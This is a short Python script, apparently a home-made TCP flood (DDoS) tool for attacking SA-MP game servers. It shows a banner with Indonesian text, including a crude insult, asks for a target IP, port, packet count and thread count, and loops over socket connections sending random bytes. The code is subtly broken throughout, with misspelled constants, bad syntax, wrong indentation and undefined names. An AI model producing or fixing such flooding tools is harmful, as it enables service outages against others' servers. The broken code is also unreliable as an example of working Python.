#!/usr/bin/env python3
#DDOS TCP BY MR.DANI
import socket
import random
import threading
import os
import sys


os.system("clear")
print("\033[31m Attacking By MR.DANI")
print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print("\033[31m DDOS ATTACK FOR SAMP")
print("\033[31m Script Ini Dibuat Hanya Untuk Team Mr.Dani")
print("\033[31m Awas kau curi kontol")

ip = str(input('[+] Ip Target: '))
port = int(input('[+] Port Target: '))
packet = int(input('[+] Packet: '))
threading = int(input('[+] Thread: '))


def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
        s = socket.socket(socket.AF_INET. socket.SDCK_STREA)
        s.connect((ip.port))
        s.send(hh)
        for i range(pack):
            s.send(hh)
        xx += 1
        print('Attacking By Mr.Dani '+ip+'| send: '+str(xx))
        except:
            s.close()
            print('Done')
            
for x  in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
    

    
